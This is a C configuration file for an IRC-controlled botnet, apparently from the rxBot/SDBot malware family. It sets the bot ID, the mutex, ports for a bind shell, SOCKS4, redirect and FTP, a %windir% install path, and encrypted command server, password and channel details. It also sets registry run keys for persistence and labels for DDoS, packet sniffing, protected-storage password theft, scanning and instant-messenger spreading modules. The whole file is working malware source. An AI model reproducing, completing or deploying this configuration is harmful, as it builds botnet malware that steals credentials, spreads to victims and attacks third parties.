
char mutexhandle[]		= "W";//*mutex handle

#ifndef _DEBUG
char botid[]			= "Q";				//*bot id
#else
char botid[]			= "Z";
#endif

unsigned short ftpdport	= 51;					//*ftpd port
BOOL staticftpd			= FALSE;				// always use ftpdport for the ftpd port
unsigned short sock4port= 526;					// socks4 port
unsigned short redirport= 518;					// redirect local port
unsigned short bindport = 71;					//*bindshell port most of the exploits use

char prefix				= '.';					//*command prefix
char movepath[]			= "%windir%";			//*path to move to

#ifdef _DEBUG
char debug_log[]		= "%windir%dfgrt.txt";
char debug_log_mode[]	= "a+";//"w+";
#endif

//--------------------------------------------------------------------------------------------------------
#ifndef NO_CRYPT
//--------------------------------------------------------------------------------------------------------

	char filename[]			= "\x5C\x5C\x8E\x4A\x1E\xCC\xB2\x29\xF8";

#ifndef NO_FCONNECT
	char cononstart[]		= "\x4C\x58\x8E\x54\x41\xCD\xF8\x26\xF4\x62\x1A\xC5\x59\x77\xDA\xB8\xDB\x8E\x72\xC2\x83\xB3\xE5\x24\xBF\x3A\xA8\x9E\x9E\x65\x3F\xFF\x99\xB2\x9B";
#endif

	char version[]			= "\x8A\x5C\x61\xDF\xBC\xD6\x83\x63";

#ifndef NO_SERVICE
	char servicename[]		= "\x5C\x74\xC0\xBA\xDE\x9B\x6F\xC8\xC3";
	char servicedisplayname[]       = "\x9B\x6F\xC8\xC3";
	char servicedesc[]		= "\xC0\xBA\xDE\x9B\x6F\xC8\xC3";
#else
	REGENT runkey = { HKEY_LOCAL_MACHINE, "\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x38\xF3\x93", "\x53\x41\x93\x45\x0B\x91\xA5\x7F\xF8\x74\x1B" };
#endif

	char password[]			= "\x57\x49\x82\x5D\x19\x8B\xB6\x25\xFE\x64\x4F\x9A\x1F";
	
#ifdef _DEBUG
	char authhost1[] = "\x57\x49\x82\x5D\x15\x8B\xB4\x3A\xDD\x7F\x0A\xCB\x48\x62\x81\xAC\xDE\x83\x68\xC2\xD9";
	char *authost[] = { authhost1 };//*!*@*
#else//nick!ident@host
	char authhost1[] = "\xDB\x86\x62\xC2\xC3\xAA\xA2\x23\xA2\x7B\xB2\x85";
	char authhost2[] = "\x14\xCC\xB9\x34\xE9";
	char authhost3[] = "\xDB\x86\x62\xC2\xC3\xAA\xA2\x23\xA2\x7B\xB2\x85";
	char *authost[] = { authhost1, authhost2, authhost3 };
#endif

#ifndef NO_VERSION_REPLY
	char versionlist1[] = "\xBD\x41\x31\xEC\x61";
	char *versionlist[] = { versionlist1 };
#endif

		SERVER servers[]={
		{   
#ifndef _DEBUG // Live Config
			"\x4C\x59\x98\x0A\x1F\x8D\xBA\x30\xF4\x62\x0E\xC6\x4F\x6A\x81\xA7\xCD\x88",
			/* (server) */
			"\x50\x49\x88\x56\x14\x90",
			/* (server password) */
			6667,
			/* (server port) */
			FALSE,
			/* (ssl) */
			"\x07\x0F\x93\x4A\x0F\x87\xB9\x22\xF8",
			/* (main channel) */
			"\x56\x1C\xCA\x50\x1E\x86",
			/* (channel keyword) */
			"\x09\x54\xD1\x4D\x39",
			/* (user mode on connect) */
			"",
			/* (channel mode on join) */
			"\x07\x0F\x93\x4A\x0F\x87\xB9\x22\xF8",
			/* (exploit channel) */
			"\x07\x0F\x93\x4A\x0F\x87\xB9\x22\xF8",
			/* (warn channel) */
			"\x07\x0F\x93\x4A\x0F\x87\xB9\x22\xF8",
			/* (sniff channel) */
		},
#else // Debug Config
			"\x4C\x59\x98\x0A\x08\x96\xB6\x23\xF1\x65\x19\xC2\x5A\x7E\xC0\xA6\xDA\xC1\x65\xC8\xC0",
			/* (server) */
			"\x50\x49\x88\x56\x14\x90",
			/* (server password) */
			6667,
			/* (server port) */
			FALSE,
			/* (ssl) */
			"\x07\x0F\x93\x4A\x0F\x87\xB9\x22\xF8",
			/* (main channel) */
			"\x50\x49\x88\x56\x14\x90",
			/* (channel keyword) */
			"\x09\x54\xD1\x4D\x39",
			/* (user mode on connect) */
			"",
			/* (channel mode on join) */
			"\x07\x0F\x93\x4A\x0F\x87\xB9\x22\xF8",
			/* (exploit channel) */
			"\x07\x0F\x93\x4A\x0F\x87\xB9\x22\xF8",
			/* (warn channel) */
			"\x07\x0F\x93\x4A\x0F\x87\xB9\x22\xF8",
			/* (sniff channel) */
		},
#endif
	};

#ifndef NO_MELT
	REGENT meltkey=	{ HKEY_LOCAL_MACHINE, "\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x39\xEE\x98\x97\x3D\x90\x42\xCC\xE9\x98\xD4\x9F\x78\xAC\xDE\x8A", "\x60\x6F\xAA\x70" };
#endif
#ifndef NO_RECORD_UPTIME
	REGENT rupkey=	{ HKEY_LOCAL_MACHINE, "\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x39\xEE\x98\x97\x3D\x90\x42\xCC\xE9\x98\xD4\x9F\x78\xAC\xDE\x8A", "\x4D\x68\xB9\x74\x2F" };
#endif
#ifndef NO_INSTALLED_TIME
	REGENT itkey=	{ HKEY_LOCAL_MACHINE, "\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x39\xEE\x98\x97\x3D\x90\x42\xCC\xE9\x98\xD4\x9F\x78\xAC\xDE\x8A", "\x4B\x45\xBE\x67\x2B\xB6" };
#endif

//------------------------------------------------------------------------------------------------------
#endif
//--------------------------------------------------------------------------------------------------------

char main_title[]		= "\2MAIN :: \2";
char threads_title[]	= "\2THREADS :: \2";
char process_title[]	= "\2PROC :: \2";
char irc_title[]		= "\2IRC :: \2";
char sec_title[]		= "\2SECURE :: \2";
char unsec_title[]		= "\2UNSECURE :: \2";
char scan_title[]		= "\2SCAN :: \2";
char ftp_title[]		= "\2FTP :: \2";
char netinfo_title[]	= "\2NETINFO :: \2";
char sysinfo_title[]	= "\2SYSINFO :: \2";
char drives_title[]		= "\2DRIVES :: \2";
char mirc_title[]		= "\2MIRC :: \2";
char file_title[]		= "\2FILE :: \2";
char download_title[]	= "\2DOWNLOAD :: \2";
char update_title[]		= "\2UPDATE :: \2";
char logic_title[]		= "\2LOGIC :: \2";
char reg_title[]		= "\2REG :: \2";
char pstore_title[]		= "\2PSTORE :: \2";
char netstatp_title[]	= "\2NETSTATP :: \2";
char sniffer_title[]	= "\2SNIFFER :: \2";
char tcp_title[]		= "\2TCP :: \2";
char udp_title[]		= "\2UDP :: \2";
char speedtest_title[]	= "\2SPEEDTEST :: \2";
char sock4_title[]		= "\2SOCKS4 :: \2";
char redirect_title[]	= "\2REDIRECT :: \2";
char ddos_title[]		= "\2DDOS :: \2";
char warn_title[]		= "\2WARN :: \2";

char imspread_title[]	= "\2IM :: \2";
char msnspread_title[]  = "\2MSN :: \2";
char aimspread_title[]  = "\2AIM :: \2";